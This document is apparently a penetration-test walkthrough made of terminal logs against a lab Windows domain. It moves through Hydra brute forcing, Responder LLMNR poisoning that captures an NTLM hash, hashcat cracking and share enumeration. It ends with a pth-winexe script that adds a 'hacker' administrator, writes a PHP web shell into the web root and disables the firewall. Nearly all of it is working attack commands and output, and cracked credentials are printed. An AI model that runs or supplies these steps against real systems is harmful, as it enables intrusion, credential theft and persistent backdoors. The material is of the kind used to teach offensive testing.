+ + -- --=[Port 80 opened... running tests...
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Jan 30 20:29:21 2016
+URL_BASE: http://192.168.1.138/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.1.138/ ----
+                                                                                                                                                                                                                                       
+-----------------
+END_TIME: Sat Jan 30 20:29:23 2016
+DOWNLOADED: 4612 - FOUND: 0
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-01-30 20:29:23
+[WARNING] http-head auth does not work with every server, better use http-get
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1496 login tries (l:34/p:44), ~0 tries per task
+[DATA] attacking service http-head on port 80
+[80][http-head] host: 192.168.1.138   login: admin   password: <<< %s(un='%s') = %u
+[STATUS] attack finished for 192.168.1.138 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-01-30 20:29:23
+ + -- --=[Port 110 closed... skipping.
+ + -- --=[Port 139 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-01-30 20:29:23
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 64 tasks, 176 login tries (l:4/p:44), ~2 tries per task
+[DATA] attacking service smb on port 445 with SSL
+[445][smb] host: 192.168.1.138   login: Administrator   password: Password123$
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-01-30 20:29:24
+ + -- --=[Port 389 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-01-30 20:29:24
+[ERROR] you may only use one of -l, -L or -m
+
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-01-30 20:29:24
+[ERROR] you may only use one of -l, -L or -m
+
+ + -- --=[Port 443 closed... skipping.
+ + -- --=[Port 445 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-01-30 20:29:24
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 64 tasks, 176 login tries (l:4/p:44), ~2 tries per task
+[DATA] attacking service smb on port 445 with SSL
+[445][smb] host: 192.168.1.138   login: Administrator   password: Password123$
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-01-30 20:29:24
+################################### Done! ###########################################
+BRUTE FORCE
+root@kali:/pentest/web/Sn1per/BruteX# ./brutex 192.168.1.129
+
+[3;J
+ __________                __         ____  ___
+ \______   \_______ __ ___/  |_  ____ \   \/  /
+  |    |  _/\_  __ \  |  \   __\/ __ \ \     / 
+  |    |   \ |  | \/  |  /|  | \  ___/ /     \ 
+  |______  / |__|  |____/ |__|  \___  >___/\  \ 
+         \/                         \/      \_/
+
+ + -- --=[BruteX v1.3 by 1N3
+ + -- --=[http://crowdshield.com
+
+
+################################### Running Port Scan ##############################
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-01 07:07 EST
+Nmap scan report for 192.168.1.129
+Host is up (0.0011s latency).
+Not shown: 23 closed ports
+PORT     STATE SERVICE
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+MAC Address: 00:0C:29:FB:8C:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
+
+################################### Running Brute Force ############################
+
+ + -- --=[Port 21 closed... skipping.
+ + -- --=[Port 22 closed... skipping.
+ + -- --=[Port 23 closed... skipping.
+ + -- --=[Port 25 closed... skipping.
+ + -- --=[Port 80 closed... skipping.
+ + -- --=[Port 110 closed... skipping.
+ + -- --=[Port 139 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:18
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 64 tasks, 176 login tries (l:4/p:44), ~2 tries per task
+[DATA] attacking service smb on port 445 with SSL
+[445][smb] host: 192.168.1.129   login: Administrator   password: password
+[445][smb] Host: 192.168.1.129 Account: admin Error: Invalid account (Anonymous success)
+[445][smb] host: 192.168.1.129   login: guest
+[445][smb] host: 192.168.1.129   login: test   password: password
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-02-01 07:07:18
+ + -- --=[Port 389 closed... skipping.
+ + -- --=[Port 443 closed... skipping.
+ + -- --=[Port 445 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:18
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 64 tasks, 176 login tries (l:4/p:44), ~2 tries per task
+[DATA] attacking service smb on port 445 with SSL
+[445][smb] host: 192.168.1.129   login: Administrator   password: password
+[445][smb] Host: 192.168.1.129 Account: admin Error: Invalid account (Anonymous success)
+[445][smb] host: 192.168.1.129   login: guest
+[445][smb] host: 192.168.1.129   login: test   password: password
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-02-01 07:07:18
+ + -- --=[Port 512 closed... skipping.
+ + -- --=[Port 513 closed... skipping.
+ + -- --=[Port 514 closed... skipping.
+ + -- --=[Port 993 closed... skipping.
+ + -- --=[Port 1433 closed... skipping.
+ + -- --=[Port 1521 closed... skipping.
+ + -- --=[Port 3306 closed... skipping.
+ + -- --=[Port 3389 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:18
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 176 login tries (l:4/p:44), ~0 tries per task
+[DATA] attacking service rdp on port 3389
+[ERROR] Child with pid 9213 terminating, can not connect
+[ERROR] Child with pid 9214 terminating, can not connect
+[ERROR] Child with pid 9212 terminating, can not connect
+[ERROR] Child with pid 9211 terminating, can not connect
+[ERROR] Child with pid 9217 terminating, can not connect
+[ERROR] Child with pid 9215 terminating, can not connect
+[ERROR] Child with pid 9218 terminating, can not connect
+[ERROR] Child with pid 9216 terminating, can not connect
+[ERROR] Child with pid 9221 terminating, can not connect
+[ERROR] Child with pid 9219 terminating, can not connect
+[ERROR] Child with pid 9220 terminating, can not connect
+[ERROR] Child with pid 9224 terminating, can not connect
+[ERROR] Child with pid 9223 terminating, can not connect
+[ERROR] Child with pid 9225 terminating, can not connect
+[ERROR] Child with pid 9222 terminating, can not connect
+[ERROR] Child with pid 9226 terminating, can not connect
+[ERROR] Child with pid 9227 terminating, can not connect
+[ERROR] Child with pid 9228 terminating, can not connect
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ + -- --=[Port 5432 closed... skipping.
+ + -- --=[Port 5900 closed... skipping.
+ + -- --=[Port 5901 closed... skipping.
+ + -- --=[Port 8000 closed... skipping.
+ + -- --=[Port 8080 closed... skipping.
+ + -- --=[Port 8100 closed... skipping.
+ + -- --=[Port 6667 closed... skipping.
+
+################################### Done! ###########################################
+root@kali:/pentest/web/Sn1per/BruteX# ./brutex 192.168.1.138
+
+[3;J
+ __________                __         ____  ___
+ \______   \_______ __ ___/  |_  ____ \   \/  /
+  |    |  _/\_  __ \  |  \   __\/ __ \ \     / 
+  |    |   \ |  | \/  |  /|  | \  ___/ /     \ 
+  |______  / |__|  |____/ |__|  \___  >___/\  \ 
+         \/                         \/      \_/
+
+ + -- --=[BruteX v1.3 by 1N3
+ + -- --=[http://crowdshield.com
+
+
+################################### Running Port Scan ##############################
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-01 07:07 EST
+Nmap scan report for 192.168.1.138
+Host is up (0.00078s latency).
+Not shown: 20 closed ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+MAC Address: 00:0C:29:82:29:F9 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
+
+################################### Running Brute Force ############################
+
+ + -- --=[Port 21 closed... skipping.
+ + -- --=[Port 22 closed... skipping.
+ + -- --=[Port 23 closed... skipping.
+ + -- --=[Port 25 closed... skipping.
+ + -- --=[Port 80 opened... running tests...
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Feb  1 07:07:41 2016
+URL_BASE: http://192.168.1.138/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.1.138/ ----
+                                                                                                                                                                                                                                       
+-----------------
+END_TIME: Mon Feb  1 07:07:43 2016
+DOWNLOADED: 4612 - FOUND: 0
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:43
+[WARNING] http-head auth does not work with every server, better use http-get
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1496 login tries (l:34/p:44), ~0 tries per task
+[DATA] attacking service http-head on port 80
+[80][http-head] host: 192.168.1.138   login: admin
+[STATUS] attack finished for 192.168.1.138 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-02-01 07:07:54
+ + -- --=[Port 110 closed... skipping.
+ + -- --=[Port 139 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:54
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 64 tasks, 176 login tries (l:4/p:44), ~2 tries per task
+[DATA] attacking service smb on port 445 with SSL
+[445][smb] host: 192.168.1.138   login: Administrator   password: Password123$
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-02-01 07:07:54
+ + -- --=[Port 389 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:54
+[ERROR] you may only use one of -l, -L or -m
+
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:54
+[ERROR] you may only use one of -l, -L or -m
+
+ + -- --=[Port 443 closed... skipping.
+ + -- --=[Port 445 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:54
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 64 tasks, 176 login tries (l:4/p:44), ~2 tries per task
+[DATA] attacking service smb on port 445 with SSL
+[445][smb] host: 192.168.1.138   login: Administrator   password: Password123$
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-02-01 07:07:54
+ + -- --=[Port 512 closed... skipping.
+ + -- --=[Port 513 closed... skipping.
+ + -- --=[Port 514 closed... skipping.
+ + -- --=[Port 993 closed... skipping.
+ + -- --=[Port 1433 closed... skipping.
+ + -- --=[Port 1521 closed... skipping.
+ + -- --=[Port 3306 closed... skipping.
+ + -- --=[Port 3389 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-02-01 07:07:54
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 176 login tries (l:4/p:44), ~0 tries per task
+[DATA] attacking service rdp on port 3389
+[STATUS] 304.00 tries/min, 304 tries in 00:01h, 18446744073709551488 todo in 5124095576030430:60h, 30 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ + -- --=[Port 5432 closed... skipping.
+ + -- --=[Port 5900 closed... skipping.
+ + -- --=[Port 5901 closed... skipping.
+ + -- --=[Port 8000 closed... skipping.
+ + -- --=[Port 8080 closed... skipping.
+ + -- --=[Port 8100 closed... skipping.
+ + -- --=[Port 6667 closed... skipping.
+
+################################### Done! ###########################################
+MAN IN THE MIDDLE (MITM)
+root@kali:~# responder -i 192.168.1.113 
+
+NBT Name Service/LLMNR Responder 2.0.
+Please send bugs/comments to: [email protected]
+To kill this script hit CRTL-C
+
+[+]NBT-NS, LLMNR & MDNS responder started
+[+]Loading Responder.conf File..
+Global Parameters set:
+Responder is bound to this interface: ALL
+Challenge set: 1122334455667788
+WPAD Proxy Server: False
+WPAD script loaded:  function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
+HTTP Server: ON
+HTTPS Server: ON
+SMB Server: ON
+SMB LM support: False
+Kerberos Server: ON
+SQL Server: ON
+FTP Server: ON
+IMAP Server: ON
+POP3 Server: ON
+SMTP Server: ON
+DNS Server: ON
+LDAP Server: ON
+FingerPrint hosts: False
+Serving Executable via HTTP&WPAD: OFF
+Always Serving a Specific File via HTTP&WPAD: OFF
+
+NBT-NS Answer sent to: 192.168.1.146. The requested name was : TEST-3F6416AC49
+NBT-NS Answer sent to: 192.168.1.138. The requested name was : TEST-3F6416AC49
+LLMNR poisoned answer sent to this IP: 192.168.1.138. The requested name was : TEST-3F6416AC49.
+NBT-NS Answer sent to: 192.168.1.138. The requested name was : BUENOSAIRES
+LLMNR poisoned answer sent to this IP: 192.168.1.138. The requested name was : BUENOSAIRES.
+NBT-NS Answer sent to: 192.168.1.129. The requested name was : XEROSECURITY
++]SMB-NTLMv1 hash captured from :  192.168.1.129
+[+]SMB complete hash is : Administrator::XEROSECURITY:2E648C1D752DE4B100000000000000000000000000000000:D08EBBB84EF4F24EAACF2F5A077FD2C91E22C1A3722C4EB9:1122334455667788
+PASSWORD CRACKING
+root@kali:~# hashcat -m 5500 /tmp/hashes /pentest/lists/passwords/
+
+Initializing hashcat v2.00 with 8 threads and 32mb segment-size...
+
+Added hashes from file /tmp/hashes: 1 (1 salts)
+Activating quick-digest mode for single-hash with salt
+
+[s]tatus [p]ause [r]esume [b]ypass [q]uit => 
+
+Input.Mode: Dict (/pentest/lists/passwords/hashkiller.com.dic)
+Index.....: 2/8 (segment), 3313392 (words), 33550341 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: 65.29M plains, 65.29M words
+Progress..: 3313392/3313392 (100.00%)
+Running...: --:--:--:--
+Estimated.: --:--:--:--
+
+ADMINISTRATOR::XEROSECURITY:2e648c1d752de4b100000000000000000000000000000000:d08ebbb84ef4f24eaacf2f5a077fd2c91e22c1a3722c4eb9:1122334455667788:Password123$
+                                             
+All hashes have been recovered
+
+Started: Sun Jan 31 15:09:14 2016
+Stopped: Sun Jan 31 15:09:16 2016
+root@kali:~# 
+ENUMERATING SMB SHARES
+root@kali:/pentest/windows/CredCrack# ./credcrack.py -d XEROSECURITY -u Administrator 
+-f /pentest/loot/win-targets.txt -l 192.168.1.113 -es
+
+Password: 
+
+ ---------------------------------------------------------------------
+  CredCrack v1.0 by Jonathan Broche (@g0jhonny)
+ ---------------------------------------------------------------------
+ 
+[*] Validating 192.168.1.129
+[*] Validating 192.168.1.138
+
+ -----------------------------------------------------------------
+ 192.168.1.129 - Windows 5.1 
+ -----------------------------------------------------------------
+ 
+ OPEN      \\192.168.1.129\C 
+ OPEN      \\192.168.1.129\Downloads 
+ OPEN      \\192.168.1.129\ADMIN$ 
+ OPEN      \\192.168.1.129\C$ 
+
+ -----------------------------------------------------------------
+ 192.168.1.138 - Windows Server 2012 R2 Datacenter 9600 
+ -----------------------------------------------------------------
+ 
+ OPEN      \\192.168.1.138\ADMIN$ 
+ CLOSED    \\192.168.1.138\C 
+ OPEN      \\192.168.1.138\C$ 
+ OPEN      \\192.168.1.138\Desktop 
+ OPEN      \\192.168.1.138\NETLOGON 
+ OPEN      \\192.168.1.138\SYSVOL 
+
+[*] Done! Completed in 0.2s
+COMMAND EXECUTION
+smb.sh
+root@kali:/pentest/windows/remote# vim smb.sh
+
+
+#!/bin/bash
+TARGET=$1
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "systeminfo"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "whoami /all"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "ipconfig /all"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "netstat -ano"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "net accounts"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "net localgroup administrators"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "net share"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "net view"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "powershell.exe -command Get-Hotfix"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "net user hacker Password123$ /add"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "net localgroup Administrators /add hacker"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "net group 'Domain Admins' /domain"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "echo ^< ?php echo passthru($_GET['cmd']); ?^> > C:\inetpub\wwwroot\backdoor.php"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fAllowToGetHelp /t REG_DWORD /d 1 /f"
+pth-winexe -U XEROSECURITY/Administrator%Password123$ --system //$TARGET "netsh firewall set opmode disable"
+
+root@kali:/pentest/windows# for a in `cat /pentest/loot/win-targets.txt`; do bash smb.sh $a; done;
+
+E_md4hash wrapper called.
+
+Host Name:                 TEST-3F6416AC49
+OS Name:                   Microsoft Windows XP Professional
+OS Version:                5.1.2600 Service Pack 2 Build 2600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Test User
+Registered Organization:   
+Product ID:                76487-640-2577743-23951
+Original Install Date:     11/2/2015, 10:44:53 AM
+System Up Time:            1 Days, 16 Hours, 44 Minutes, 36 Seconds
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System type:               X86-based PC
+Processor(s):              4 Processor(s) Installed.
+                           [01]: x86 Family 6 Model 26 Stepping 5 GenuineIntel ~3184 Mhz
+                           [02]: x86 Family 6 Model 26 Stepping 5 GenuineIntel ~3184 Mhz
+                           [03]: x86 Family 6 Model 26 Stepping 5 GenuineIntel ~3184 Mhz
+                           [04]: x86 Family 6 Model 26 Stepping 5 GenuineIntel ~3184 Mhz
+BIOS Version:              INTEL  - 6040000
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT-05:00) Eastern Time (US & Canada)
+Total Physical Memory:     511 MB
+Available Physical Memory: 324 MB
+Virtual Memory: Max Size:  2,048 MB
+Virtual Memory: Available: 2,008 MB
+Virtual Memory: In Use:    40 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    xerosecurity.com
+Logon Server:              N/A
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: Q147222
+NetWork Card(s):           1 NIC(s) Installed.
+                           [01]: VMware Accelerated AMD PCNet Adapter
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.1.1
+                                 IP address(es)
+                                 [01]: 192.168.1.129
+E_md4hash wrapper called.
+Error: error Creating process(whoami /all) 2
+E_md4hash wrapper called.
+
+Windows IP Configuration
+
+        Host Name . . . . . . . . . . . . : test-3f6416ac49
+        Primary Dns Suffix  . . . . . . . : xerosecurity.com
+        Node Type . . . . . . . . . . . . : Unknown
+        IP Routing Enabled. . . . . . . . : No
+        WINS Proxy Enabled. . . . . . . . : No
+        DNS Suffix Search List. . . . . . : xerosecurity.com
+
+Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : 
+        Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter
+        Physical Address. . . . . . . . . : 00-0C-29-FB-8C-7C
+        Dhcp Enabled. . . . . . . . . . . : Yes
+        Autoconfiguration Enabled . . . . : Yes
+        IP Address. . . . . . . . . . . . : 192.168.1.129
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.1.1
+        DHCP Server . . . . . . . . . . . : 192.168.1.1
+        DNS Servers . . . . . . . . . . . : 206.248.154.22
+                                            206.248.154.170
+                                            192.168.1.1
+        Lease Obtained. . . . . . . . . . : Monday, February 01, 2016 2:36:34 AM
+        Lease Expires . . . . . . . . . . : Tuesday, February 02, 2016 2:36:34 AM
+E_md4hash wrapper called.
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       976
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:2869           0.0.0.0:0              LISTENING       1268
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       912
+  TCP    127.0.0.1:1039         0.0.0.0:0              LISTENING       212
+  TCP    192.168.1.129:139      0.0.0.0:0              LISTENING       4
+  TCP    192.168.1.129:445      192.168.1.113:41671    ESTABLISHED     4
+  TCP    192.168.1.129:445      192.168.1.113:46445    ESTABLISHED     4
+  TCP    192.168.1.129:445      192.168.1.113:47203    ESTABLISHED     4
+  TCP    192.168.1.129:2990     206.248.168.153:80     CLOSE_WAIT      2592
+  TCP    192.168.1.129:2991     206.248.168.153:80     CLOSE_WAIT      2592
+  TCP    192.168.1.129:3600     192.168.1.138:139      TIME_WAIT       0
+  TCP    192.168.1.129:3601     192.168.1.138:139      TIME_WAIT       0
+  TCP    192.168.1.129:3603     192.168.1.138:139      TIME_WAIT       0
+  TCP    192.168.1.129:3605     192.168.1.138:135      ESTABLISHED     708
+  TCP    192.168.1.129:3606     192.168.1.138:49158    ESTABLISHED     708
+  UDP    0.0.0.0:445            *:*                                    4
+  UDP    0.0.0.0:500            *:*                                    708
+  UDP    0.0.0.0:1027           *:*                                    1196
+  UDP    0.0.0.0:1028           *:*                                    1196
+  UDP    0.0.0.0:4500           *:*                                    708
+  UDP    127.0.0.1:123          *:*                                    1072
+  UDP    127.0.0.1:1321         *:*                                    1072
+  UDP    127.0.0.1:1900         *:*                                    1268
+  UDP    192.168.1.129:123      *:*                                    1072
+  UDP    192.168.1.129:137      *:*                                    4
+  UDP    192.168.1.129:138      *:*                                    4
+  UDP    192.168.1.129:1900     *:*                                    1268
+E_md4hash wrapper called.
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          0
+Maximum password age (days):                          Unlimited
+Minimum password length:                              0
+Length of password history maintained:                None
+Lockout threshold:                                    Never
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        WORKSTATION
+The command completed successfully.
+
+E_md4hash wrapper called.
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+hacker
+test
+test2
+XEROSECURITY\Domain Admins
+The command completed successfully.
+
+E_md4hash wrapper called.
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+ADMIN$       C:\WINDOWS                      Remote Admin                      
+C$           C:\                             Default share                     
+IPC$                                         Remote IPC                        
+C            C:\                             
+Downloads    C:\Documents and Settings\test\My Documents\Downloads
+                                             
+The command completed successfully.
+
+E_md4hash wrapper called.
+Error: error Creating process(powershell.exe -command Get-Hotfix) 2
+E_md4hash wrapper called.
+The account already exists.
+
+More help is available by typing NET HELPMSG 2224.
+
+E_md4hash wrapper called.
+System error 1378 has occurred.
+
+The specified account name is already a member of the local group.
+
+E_md4hash wrapper called.
+The syntax of this command is:
+
+
+NET GROUP 
+[groupname [/COMMENT:"text"]] [/DOMAIN]
+          groupname {/ADD [/COMMENT:"text"] | /DELETE}  [/DOMAIN]
+          groupname username [...] {/ADD | /DELETE} [/DOMAIN]
+
+E_md4hash wrapper called.
+Error: error Creating process(echo ^ > C:\inetpub\wwwroot\backdoor.php) 2
+E_md4hash wrapper called.
+
+Error:  Invalid key name
+E_md4hash wrapper called.
+Ok.
+
+E_md4hash wrapper called.
+
+Host Name:                 WIN-8MSB2DD52P9
+OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00253-50000-00000-AA442
+Original Install Date:     7/4/2015, 7:01:25 AM
+System Boot Time:          1/30/2016, 2:26:03 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 26 Stepping 5 GenuineIntel ~3184 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 5/20/2014
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
+Total Physical Memory:     511 MB
+Available Physical Memory: 40 MB
+Virtual Memory: Max Size:  1,443 MB
+Virtual Memory: Available: 597 MB
+Virtual Memory: In Use:    846 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    xerosecurity.com
+Logon Server:              N/A
+Hotfix(s):                 15 Hotfix(s) Installed.
+                           [01]: KB2862152
+                           [02]: KB2868626
+                           [03]: KB2876331
+                           [04]: KB2883200
+                           [05]: KB2884101
+                           [06]: KB2884846
+                           [07]: KB2887595
+                           [08]: KB2888505
+                           [09]: KB2894029
+                           [10]: KB2894179
+                           [11]: KB2898514
+                           [12]: KB2900986
+                           [13]: KB2901101
+                           [14]: KB2906956
+                           [15]: KB2908174
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.1.1
+                                 IP address(es)
+                                 [01]: 192.168.1.138
+                                 [02]: fe80::7494:32dd:efa1:e825
+                                 [03]: fd2c:60b4:7f15:0:7494:32dd:efa1:e825
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+E_md4hash wrapper called.
+
+USER INFORMATION
+----------------
+
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
+SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeTcbPrivilege                  Act as part of the operating system       Enabled 
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Enabled 
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled 
